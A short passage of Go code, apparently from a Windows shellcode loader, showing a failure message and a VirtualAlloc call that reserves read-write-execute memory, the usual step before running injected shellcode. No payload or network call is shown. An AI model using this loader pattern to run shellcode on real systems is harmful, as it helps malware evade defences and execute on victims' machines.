		return "Shellcode failed..."
	}
	addr, _, _ := windows.ProcVirtualAlloc.Call(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
